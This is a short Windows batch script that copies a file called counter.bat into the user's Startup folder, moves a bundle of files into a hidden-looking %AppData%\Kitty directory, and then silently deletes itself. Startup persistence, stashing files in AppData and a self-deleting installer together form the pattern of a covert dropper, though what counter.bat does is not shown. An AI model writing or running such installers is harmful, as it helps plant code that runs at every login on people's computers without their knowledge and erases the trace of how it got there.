move ".\Files\counter.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
md "%AppData%\Kitty"
move ".\Files" "%AppData%\Kitty" 

start /b "" cmd /c del "%~f0"&exit /b